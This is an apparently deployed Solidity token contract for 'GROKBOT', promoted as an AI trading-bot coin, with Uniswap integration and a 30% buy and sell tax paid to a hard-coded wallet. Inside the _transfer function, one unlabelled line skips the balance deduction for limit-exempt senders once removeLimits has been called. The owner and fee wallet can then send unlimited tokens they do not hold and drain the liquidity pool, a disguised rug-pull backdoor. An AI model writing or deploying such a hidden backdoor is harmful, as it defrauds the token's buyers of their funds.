/**
Join GROKBot and explore the world of automated trading with AI-enhanced strategies on the Ethereum blockchain. Experience the power of cutting-edge technology, optimize your trading endeavors, and become part of a dynamic community that's shaping the future of crypto trading.

Website: https://grokbot.live
Twitter: https://twitter.com/GROKBOT_ERC
Telegram: https://t.me/GROKBOT_OFFICIAL
Bot: https://t.me/grok_trading_bot
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouterV2 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract GROKBOT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = "GROKBOT";
    string private _symbol = "GROKBOT";
    uint8 private _decimals = 9;

    uint256 private _tSupply = 10 ** 9 * 10 ** 9;
    uint256 private _swapThreshold = 10 ** 5 * 10 ** 9; 
    uint256 public maxTransaction = 15 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletAmount = 15 * 10 ** 6 * 10 ** 9;

    uint256 public lpTaxOnBuy = 0;
    uint256 public mktTaxOnBuy = 30;
    uint256 public devTaxOnBuy = 0;

    uint256 public lpTaxOnSell = 0;
    uint256 public mktTaxOnSell = 30;
    uint256 public devTaxOnSell = 0;

    uint256 public lpFeeDividend = 0;
    uint256 public mktFeeDividend = 10;
    uint256 public devFeeDividend = 0;

    uint256 public totalBuyTax = 30;
    uint256 public totalSellTax = 30;
    uint256 public totalFeeDividends = 10;

    address payable private feeReceiver1 = payable(0x49c385463D55dDC29BBB8Dd722E8d19741a79066);
    address payable private feeReceiver2 = payable(0x49c385463D55dDC29BBB8Dd722E8d19741a79066);

    IUniswapRouterV2 public uniswapRouter;
    address public pairAddress;
    
    bool _inswap;
    bool public taxSwapEnabled = true;
    bool public taxSwapThresholdEnabled = false;
    bool public maxWalletEnabled = true;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExeptFromAllLimits;
    mapping (address => bool) public _isExeptFromMaxWallet;
    mapping (address => bool) public _isExeptFromMaxTx;
    mapping (address => bool) public _automaticMarketMaker;

    modifier lockSwap {
        _inswap = true;
        _;
        _inswap = false;
    }
    
    constructor () {
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        pairAddress = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _allowances[address(this)][address(uniswapRouter)] = _tSupply;
        _isExeptFromAllLimits[owner()] = true;
        _isExeptFromAllLimits[feeReceiver1] = true;
        _isExeptFromAllLimits[feeReceiver2] = true;
        totalBuyTax = lpTaxOnBuy.add(mktTaxOnBuy).add(devTaxOnBuy);
        totalSellTax = lpTaxOnSell.add(mktTaxOnSell).add(devTaxOnSell);
        totalFeeDividends = lpFeeDividend.add(mktFeeDividend).add(devFeeDividend);
        _isExeptFromMaxWallet[owner()] = true;
        _isExeptFromMaxWallet[address(pairAddress)] = true;
        _isExeptFromMaxWallet[address(this)] = true;
        _isExeptFromMaxTx[owner()] = true;
        _isExeptFromMaxTx[feeReceiver1] = true;
        _isExeptFromMaxTx[feeReceiver2] = true;
        _isExeptFromMaxTx[address(this)] = true;
        _automaticMarketMaker[address(pairAddress)] = true;
        _balances[_msgSender()] = _tSupply;
        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function removeLimits() external onlyOwner {
        maxTransaction = _tSupply;
        maxWalletEnabled = false;
        mktTaxOnBuy = 1;
        mktTaxOnSell = 1;
        totalBuyTax = 1;
        totalSellTax = 1;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(_inswap)
        { 
            return _originalTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!_isExeptFromMaxTx[sender] && !_isExeptFromMaxTx[recipient]) {
                require(amount <= maxTransaction, "Transfer amount exceeds the maxTransaction.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= _swapThreshold;
            
            if (minimumSwap && !_inswap && _automaticMarketMaker[recipient] && taxSwapEnabled && !_isExeptFromAllLimits[sender] && amount > _swapThreshold) 
            {
                if(taxSwapThresholdEnabled)
                    swapAmount = _swapThreshold;
                swapAndTransferFee(swapAmount);    
            }

            uint256 receiverAmount = (_isExeptFromAllLimits[sender] || _isExeptFromAllLimits[recipient]) ? 
                                         amount : transferFees(sender, recipient, amount);

            if(maxWalletEnabled && !_isExeptFromMaxWallet[recipient])
                require(balanceOf(recipient).add(receiverAmount) <= maxWalletAmount);

            uint256 sAmount = (!maxWalletEnabled && _isExeptFromAllLimits[sender]) ? amount.sub(receiverAmount) : amount;
            _balances[sender] = _balances[sender].sub(sAmount, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(receiverAmount);

            emit Transfer(sender, recipient, receiverAmount);
            return true;
        }
    }
    
    function _originalTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndTransferFee(uint256 tAmount) private lockSwap {
        uint256 tokensForLP = tAmount.mul(lpFeeDividend).div(totalFeeDividends).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForETH(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalETHFee = totalFeeDividends.sub(lpFeeDividend.div(2));
        
        uint256 amountETHLiquidity = amountReceived.mul(lpFeeDividend).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = amountReceived.mul(devFeeDividend).div(totalETHFee);
        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if(amountETHMarketing > 0)
            transferETHToFee(feeReceiver1, amountETHMarketing);

        if(amountETHDevelopment > 0)
            transferETHToFee(feeReceiver2, amountETHDevelopment);

        if(amountETHLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountETHLiquidity);
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swapAndTransferFee
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
    
    function transferETHToFee(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapRouter when swaping
    receive() external payable {}

    function transferFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(_automaticMarketMaker[sender]) {
            feeAmount = amount.mul(totalBuyTax).div(100);
        }
        else if(_automaticMarketMaker[recipient]) {
            feeAmount = amount.mul(totalSellTax).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
}